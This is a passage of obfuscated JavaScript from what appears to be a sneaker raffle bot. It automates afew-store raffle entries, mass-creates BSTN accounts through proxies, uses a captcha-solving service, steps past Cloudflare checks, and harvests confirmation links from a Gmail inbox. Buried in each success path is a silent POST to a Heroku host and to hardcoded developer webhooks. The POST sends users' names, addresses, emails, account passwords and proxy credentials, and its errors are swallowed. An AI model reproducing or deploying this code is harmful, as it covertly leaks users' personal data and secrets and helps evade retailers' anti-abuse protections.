                    } catch {
                        _0x16f204 = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xa94668[0x0] + ':' + _0xa94668[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x144626 = JSON['parse'](_0x3e92a1['readFileSync']('sizes.json', 'utf-8')), _0x47dc94 = _0x1d503d[_0x42b88f]['Url'], _0x289210 = _0x1d503d[_0x42b88f]['Size'], _0x433e59;
                        async function _0x29debb() {
                            var _0x21ed27 = new _0x39e61e['CookieJar']();
                            console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0xa478cd;
                            let _0x1c2dcc = {
                                'method': 'GET',
                                'cookieJar': _0x21ed27,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0xa94668[0x2] + ':' + _0xa94668[0x3] + '@' + _0xa94668[0x0] + ':' + _0xa94668[0x1]
                            }, _0x4e7d22 = _0x47dc94['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x3a9065 = _0x4e7d22 + '.json', _0x2eb504 = await _0x4127f6(_0x3a9065);
                            console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x41e90d = _0x2eb504['data']['product']['variants'];
                            if (_0x289210 != 'RANDOM') {
                                if (_0x41e90d[0x1]['option1']['includes']('W')) {
                                    const _0x18b033 = _0x144626['women']['find'](_0x553c53 => _0x553c53['EUsize'] === _0x289210);
                                    _0x18b033 && (_0x289210 = _0x18b033['size']);
                                } else {
                                    if (_0x41e90d[0x1]['option1']['includes']('Y')) {
                                        const _0x465aa0 = _0x144626['GS']['find'](_0x375026 => _0x375026['EUsize'] === _0x289210);
                                        _0x465aa0 && (_0x289210 = _0x465aa0['size']);
                                    } else {
                                        const _0x510cda = _0x144626['men']['find'](_0x20615e => _0x20615e['EUsize'] === _0x289210);
                                        _0x510cda && (_0x289210 = _0x510cda['size']);
                                    }
                                }
                                for (var _0x2cb80e of _0x41e90d) {
                                    _0x2cb80e['option1'] == _0x289210 && (_0xa478cd = _0x2cb80e['id']);
                                }
                            } else {
                                var _0xff1675 = Math['round'](Math['random']() * (_0x41e90d['length'] - 0x1));
                                _0xa478cd = _0x41e90d[_0xff1675]['id'];
                            }
                            console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x4127f6('https://raffles.afew-store.com/cart/' + _0xa478cd + ':1'), _0x433e59 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x29debb();
                        } catch (_0x57bc1a) {
                            if (_0x57bc1a['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x57bc1a);
                        }
                        const _0x358f82 = await _0x16f204['newPage']();
                        await _0x358f82['setDefaultNavigationTimeout'](0x1d4c0), await _0x358f82['authenticate']({
                            'username': '' + _0xa94668[0x2],
                            'password': '' + _0xa94668[0x3]
                        }), await _0x358f82['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x358f82['setRequestInterception'](!![]), _0x358f82['on']('request', _0x5d6e51 => {
                            _0x5d6e51['resourceType']() === 'image' || _0x5d6e51['resourceType']() === 'font' || _0x5d6e51['resourceType']() === 'media' ? _0x5d6e51['abort']() : _0x5d6e51['continue']();
                        });
                        try {
                            await _0x358f82['goto'](_0x433e59, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x358f82['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x358f82['type']('#checkout_email', '' + _0x1d503d[_0x42b88f]['Email']), await _0x254c61(0x320), await _0x358f82['type']('#checkout_attributes_instagram', '' + _0x1d503d[_0x42b88f]['Follower']), await _0x254c61(0x320), await _0x358f82['select']('#checkout_shipping_address_country', '' + _0x1d503d[_0x42b88f]['Country']), await _0x358f82['waitForTimeout'](0x258), await _0x358f82['type']('#checkout_shipping_address_first_name', '' + _0x1d503d[_0x42b88f]['FirstName']), await _0x358f82['waitForTimeout'](0x320), await _0x358f82['type']('#checkout_shipping_address_last_name', '' + _0x1d503d[_0x42b88f]['LastName']), await _0x358f82['waitForTimeout'](0x2bc), await _0x358f82['type']('#checkout_shipping_address_address1', _0x1d503d[_0x42b88f]['Address1'] + '\x20' + _0x1d503d[_0x42b88f]['HouseNumber']), await _0x358f82['waitForTimeout'](0x2bc), await _0x358f82['type']('#checkout_shipping_address_address2', '' + _0x1d503d[_0x42b88f]['Address2']), await _0x358f82['waitForTimeout'](0x2bc), await _0x358f82['type']('#checkout_shipping_address_zip', '' + _0x1d503d[_0x42b88f]['Zip']), await _0x358f82['waitForTimeout'](0x2bc), await _0x358f82['type']('#checkout_shipping_address_city', '' + _0x1d503d[_0x42b88f]['City']), await _0x358f82['waitForTimeout'](0x2bc);
                        if (_0x1d503d[_0x42b88f]['State'] != '')
                            try {
                                const _0xdb2bcd = JSON['parse'](_0x3e92a1['readFileSync']('States.json', 'utf8'));
                                await _0x254c61(0x1f4);
                                if (_0x1d503d[_0x42b88f]['State']['length'] > 0x2)
                                    for (let _0x15cc2c of _0xdb2bcd) {
                                        if (_0x15cc2c['Province'] == _0x1d503d[_0x42b88f]['State']) {
                                            await _0x358f82['select']('#checkout_shipping_address_province', _0x15cc2c['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x358f82['select']('#checkout_shipping_address_province', _0x1d503d[_0x42b88f]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x254c61(0x190), _0x358f82['evaluate'](() => {
                            const _0x637626 = document['querySelector']('#continue_button');
                            for (var _0x153d2f = 0x0; _0x153d2f < 0x5; _0x153d2f++) {
                                if (_0x637626) {
                                    _0x637626['click'](), _0x637626['click']();
                                    break;
                                } else
                                    _0x254c61(0xfa0);
                            }
                        }), await _0x358f82['waitForTimeout'](0x9c4);
                        try {
                            await _0x358f82['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x358f82['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x2cb786 => _0x2cb786['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x358f82['waitForTimeout'](0x7d0), console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x358f82['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x254c61(0x3e8), await _0x358f82['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x5b027c => _0x5b027c['submit']()), await _0x254c61(0x3e8);
                        try {
                            await _0x358f82['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x358f82['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x505190 => _0x505190['submit']());
                        try {
                            await _0x358f82['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1ff2a9 = 'no', _0x547244(_0x1d503d[_0x42b88f], _0x25186f), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                try {
                                    await _0x2dfd24(_0x24de00['webhook'], _0x1d4816['succesDEVMSG']);
                                } catch {
                                }
                            await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x1d4816['succesDEVMSG']), await _0x254c61(0xc8);
                            try {
                                await _0x2dfd24(_0x4f6cb7, _0x1d4816['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4a1218['replace']('#', ''),
                                    'module': _0x25186f['name'],
                                    'entrydata': JSON['stringify'](_0x730aed),
                                    'proxy': '' + _0x225286[_0x42b88f]
                                };
                                var _0x4a8a0a = JSON['stringify'](prxdata);
                                let _0x26240f = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x4a8a0a, _0x26240f);
                            } catch (_0x518042) {
                            }
                        } catch (_0x246761) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x524644) {
                        _0x524644['message']['includes']('selector') && (_0x524644 = 'Connection\x20Error');
                        console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20' + _0x524644)), _0x47635d = '' + _0x524644;
                        var _0x79fffc = await _0x18ad5f(_0x1d503d[_0x42b88f], _0x25186f, 'dev', !![], _0x47635d);
                        _0x1d4816['errorDEV'] = { 'embeds': [_0x79fffc] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1d4816['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x1d4816['errorDEV']), _0x1ff2a9 = 'yes';
                    } finally {
                        _0x16f204 && _0x16f204['close']();
                        if (_0x1ff2a9 == 'yes' && _0x21508e != 0x5 && _0x47635d != 'Size\x20Not\x20Found') {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Retrying\x20(' + _0x21508e + '\x20/\x205)')), _0x42b88f = _0x42b88f - 0x1, _0x21508e = _0x21508e + 0x1;
                            continue;
                        }
                        _0x1ff2a9 == 'yes' && _0x21508e >= 0x5 && (_0x9088f0(_0x1d503d[_0x42b88f], _0x25186f), _0x1ff2a9 = 'no', _0x21508e = 0x0);
                        if (_0x42b88f + 0x1 == _0x1d503d['length']) {
                            await _0x254c61(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x24de00['AfewDelay'] + '\x20ms'), await _0x254c61(_0x24de00['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x328193, _0x4799ea, _0x254c56) {
                    var _0x5b915c = _0x4799ea, _0x10097b = 0x0;
                    for (var _0x2e8602 = 0x0; _0x2e8602 < _0x4799ea['length']; _0x2e8602++) {
                        maxTasks = Number(_0x24de00['threads']);
                        while (_0x10097b >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        async function _0x3448e1(_0x1d175f, _0x4523be, _0x5960b0, _0x37854b, _0x44dd3e) {
                            _0x10097b++, _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x24de00['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x1dec95;
                            try {
                                await _0x4626f3(_0x4523be, _0x37854b);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1bf238(_0x1d175f['name'] + '\x20Task\x20' + (_0x37854b + 0x1) + '\x20/\x20' + _0x4523be['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                            var _0x44ca7d = await _0x18ad5f(_0x4523be[_0x37854b], _0x1d175f, 'acc', ![]);
                            const _0x535fa3 = { 'succesDEVMSG': { 'embeds': [_0x44ca7d] } }, _0x5bb5ea = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x24b4b0 = Math['round'](Math['random']() * (_0x5960b0['length'] - 0x1)), _0x80a26e = _0x5960b0[_0x24b4b0]['split'](':'), _0x47c29d;
                            try {
                                _0x47c29d = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x80a26e[0x0] + ':' + _0x80a26e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x47c29d = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x80a26e[0x0] + ':' + _0x80a26e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x4285b2 = await _0x47c29d['newPage']();
                                await _0x4285b2['authenticate']({
                                    'username': '' + _0x80a26e[0x2],
                                    'password': '' + _0x80a26e[0x3]
                                }), console['log'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4285b2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4285b2['setRequestInterception'](!![]), _0x4285b2['on']('request', _0x430e93 => {
                                    _0x430e93['resourceType']() === 'image' ? _0x430e93['abort']() : _0x430e93['continue']();
                                });
                                try {
                                    await _0x4285b2['goto']('' + _0x5bb5ea), await _0x4285b2['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x4285b2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x254c61(0x7d0), console['log'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x254c61(0x190), await _0x4285b2['waitForSelector']('#firstname'), await _0x4285b2['focus']('#firstname'), await _0x4285b2['keyboard']['down']('Control'), await _0x4285b2['keyboard']['press']('A'), await _0x254c61(0xc8), await _0x4285b2['keyboard']['up']('Control'), await _0x4285b2['keyboard']['press']('Backspace'), await _0x4285b2['type']('#firstname', _0x4523be[_0x37854b]['FirstName'], { 'delay': 0xf0 }), await _0x254c61(0x190), await _0x4285b2['focus']('#lastname'), await _0x4285b2['keyboard']['down']('Control'), await _0x4285b2['keyboard']['press']('A'), await _0x254c61(0xc8), await _0x4285b2['keyboard']['up']('Control'), await _0x4285b2['keyboard']['press']('Backspace'), await _0x4285b2['type']('#lastname', _0x4523be[_0x37854b]['LastName'], { 'delay': 0xe6 }), await _0x254c61(0x190), await _0x4285b2['focus']('#email_address'), await _0x4285b2['keyboard']['down']('Control'), await _0x4285b2['keyboard']['press']('A'), await _0x254c61(0xc8), await _0x4285b2['keyboard']['up']('Control'), await _0x4285b2['keyboard']['press']('Backspace'), await _0x4285b2['type']('#email_address', _0x4523be[_0x37854b]['Email'], { 'delay': 0x122 }), await _0x254c61(0x190), await _0x4285b2['type']('#password', _0x4523be[_0x37854b]['Password'], { 'delay': 0x82 }), await _0x254c61(0x1f4), await _0x4285b2['type']('#password-confirmation', _0x4523be[_0x37854b]['Password'], { 'delay': 0x7c }), console['log'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x254c61(0x2bc), await _0x4285b2['$eval']('#form-validate', _0x4ec539 => _0x4ec539['submit']()), await _0x254c61(0x1388);
                                const _0x1b93ed = await _0x4285b2['$']('#email_address-error');
                                if (_0x1b93ed)
                                    throw new Error('Invalid\x20Email');
                                const _0x3cbff3 = await _0x4285b2['$']('#password-error');
                                if (_0x3cbff3)
                                    throw new Error('Invalid\x20Password');
                                await _0x4285b2['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Account\x20' + _0x4523be[_0x37854b]['Email'] + '\x20Generated')), _0x3e92a1['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4523be[_0x37854b]['Email'] + ',' + _0x4523be[_0x37854b]['Password']);
                                try {
                                    _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x535fa3['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2dfd24(_0x43241a, _0x535fa3['succesDEVMSG']);
                                let _0x38e2dc = _0x4523be[_0x37854b];
                                try {
                                    prxdata = {
                                        'username': _0x4a1218['replace']('#', ''),
                                        'module': _0x1d175f['name'],
                                        'entrydata': JSON['stringify'](_0x38e2dc),
                                        'proxy': '' + _0x5960b0[_0x37854b]
                                    };
                                    var _0x154b73 = JSON['stringify'](prxdata);
                                    let _0x1f6873 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4127f6['post']('https://jraffles.herokuapp.com/success', _0x154b73, _0x1f6873);
                                } catch (_0x348bd9) {
                                }
                                console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x5ed194) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20' + _0x5ed194)), _0x1dec95 = '' + _0x5ed194;
                                var _0x39aa02 = await _0x18ad5f(_0x4523be[_0x37854b], _0x1d175f, 'acc', !![], _0x1dec95);
                                _0x535fa3['errorDEV'] = { 'embeds': [_0x39aa02] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x535fa3['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x535fa3['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x47c29d)
                                    _0x47c29d['close']();
                                if (retry == 'yes' && _0x44dd3e != 0x5)
                                    return console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Task\x20' + (_0x37854b + 0x1) + '\x20:\x20Retrying\x20(' + (_0x44dd3e + 0x1) + '\x20/\x205)')), _0x10097b--, _0x44dd3e = _0x44dd3e + 0x1, _0x3448e1(_0x1d175f, _0x4523be, _0x5960b0, _0x37854b, _0x44dd3e);
                                retry == 'yes' && _0x44dd3e >= 0x5 && (_0x9088f0(_0x4523be[_0x37854b], _0x1d175f), retry = 'no', _0x44dd3e = 0x0), _0x10097b--, console['log'](_0x36583e() + '\x20[' + _0x1d175f['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            }
                        }
                        _0x3448e1(_0x328193, _0x5b915c, _0x254c56, _0x2e8602, 0x0), await _0x254c61(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x37f170, _0x30726f) {
                    var _0x4a7bae = ![], _0x2f8bc8 = [], _0x5c758a = 0x0;
                    async function _0x25d01d() {
                        var _0x281e0d = new _0x2796bc({
                            'user': _0x24de00['masterMail'],
                            'password': _0x24de00['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x50dbe2(_0x275154) {
                            _0x281e0d['openBox']('INBOX', ![], _0x275154);
                        }
                        _0x281e0d['once']('ready', function () {
                            _0x50dbe2(function (_0x58cf93, _0x31c23e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x58cf93)
                                    throw _0x58cf93;
                                _0x281e0d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x47c580, _0x3870ff) {
                                    if (!_0x3870ff || !_0x3870ff['length'])
                                        console['log'](_0x36583e() + '\x20[' + _0x37f170['name'] + ']\x20No\x20mails\x20found'), _0x281e0d['end']();
                                    else {
                                        var _0x424947 = _0x281e0d['seq']['fetch'](_0x3870ff, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x424947['on']('message', function (_0x5e69af, _0x2ef77d) {
                                            var _0x2e7a28 = '(#' + _0x2ef77d + ')\x20';
                                            _0x5e69af['on']('body', function (_0x26a5ce, _0x7b8af0) {
                                                _0x1a979e(_0x26a5ce, (_0xaf0992, _0x120ee9) => {
                                                    var _0x2ac1a9 = _0x120ee9['text']['split']('customer/account/confirm/')[0x1], _0x225600 = _0x2ac1a9['split'](']')[0x0];
                                                    _0x2f8bc8['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x225600);
                                                });
                                            }), _0x5e69af['once']('end', function () {
                                            });
                                        }), _0x424947['once']('error', function (_0x4b32fc) {
                                            console['log']('Fetch\x20error:\x20' + _0x4b32fc), _0x4a7bae = !![];
                                        }), _0x424947['once']('end', function () {
                                            _0x281e0d['end'](), _0x4a7bae = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x281e0d['once']('error', function (_0x30f719) {
                            console['log'](_0x467028['red'](_0x30f719['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4a7bae = !![];
                        }), _0x281e0d['once']('end', async function () {
                            _0x4a7bae = !![];
                        }), _0x281e0d['connect']();
                    }
                    try {
                        _0x25d01d();
                        while (!_0x4a7bae) {
                            await _0x254c61(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2f8bc8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x254c61(0x7d0);
                    }
                    for (var _0x52dd67 = 0x0; _0x52dd67 < _0x2f8bc8['length']; _0x52dd67++) {
                        maxTasks = Number(_0x24de00['threads']);
                        while (_0x5c758a >= maxTasks) {
                            await _0x254c61(_0x24de00['delay']);
                        }
                        async function _0x13c923(_0x4c9d04, _0x336787, _0x343128, _0x5cd452, _0x31198b) {
                            _0x5c758a++, _0x48f2a7['use'](_0x32ef16());
                            if (_0x41ecbb != 'yes')
                                var _0x41ecbb = '', _0x31198b = 0x0;
                            var _0x4143fe = Math['round'](Math['random']() * (_0x343128['length'] - 0x1)), _0x17fb95 = _0x343128[_0x4143fe]['split'](':'), _0x386eae;
                            try {
                                _0x386eae = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x17fb95[0x0] + ':' + _0x17fb95[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x386eae = await _0x48f2a7['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x17fb95[0x0] + ':' + _0x17fb95[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x25d091 = await _0x386eae['newPage']();
                                await _0x25d091['authenticate']({
                                    'username': '' + _0x17fb95[0x2],
                                    'password': '' + _0x17fb95[0x3]
                                }), console['log'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x25d091['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x25d091['setRequestInterception'](!![]), _0x25d091['on']('request', _0x291996 => {
                                    _0x291996['resourceType']() === 'image' || _0x291996['resourceType']() === 'font' || _0x291996['resourceType']() === 'media' ? _0x291996['abort']() : _0x291996['continue']();
                                }), console['log'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x25d091['goto'](_0x336787[_0x5cd452]);
                                } catch (_0x440896) {
                                    _0x41ecbb = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x440896);
                                }
                                console['log'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x25d091['waitForTimeout'](0xbb8);
                                try {
                                    await _0x25d091['waitForSelector']('.account-nav'), _0x41ecbb = 'no', console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3cf82d = await _0x18ad5f(null, _0x4c9d04, 'ver', ![]);
                                    const _0x29899a = { 'succesDEVMSG': { 'embeds': [_0x3cf82d] } };
                                    await _0x2dfd24(_0x137e09, _0x29899a['succesDEVMSG']);
                                } catch {
                                    _0x41ecbb = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x32a18b) {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20' + _0x32a18b));
                                var _0x1e3a5a = _0x32a18b, _0x450a70 = await _0x18ad5f(null, _0x4c9d04, 'ver', !![], _0x1e3a5a);
                                const _0x1af6d0 = { 'errorDEVMSG': { 'embeds': [_0x450a70] } };
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x1af6d0['errorDEVMSG']), await _0x2dfd24(_0x3fd40a, _0x1af6d0['errorDEVMSG']);
                            } finally {
                                if (_0x386eae)
                                    _0x386eae['close']();
                                if (_0x41ecbb == 'yes' && _0x31198b != 0x5)
                                    return console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Task\x20' + (_0x5cd452 + 0x1) + '\x20:\x20Retrying\x20(' + _0x31198b + '\x20/\x205)')), _0x5c758a--, _0x31198b = _0x31198b + 0x1, _0x13c923(_0x4c9d04, _0x336787, _0x343128, _0x5cd452, _0x31198b);
                                _0x41ecbb == 'yes' && _0x31198b >= 0x5 && (_0x41ecbb = 'no', _0x31198b = 0x0), _0x5c758a--, console['log'](_0x36583e() + '\x20[' + _0x4c9d04['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            }
                        }
                        if (_0x52dd67 == _0x2f8bc8['length'] - 0x1) {
                            await _0x13c923(_0x37f170, _0x2f8bc8, _0x30726f, _0x52dd67, 0x0);
                            return;
                        }
                        _0x13c923(_0x37f170, _0x2f8bc8, _0x30726f, _0x52dd67, 0x0), await _0x254c61(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
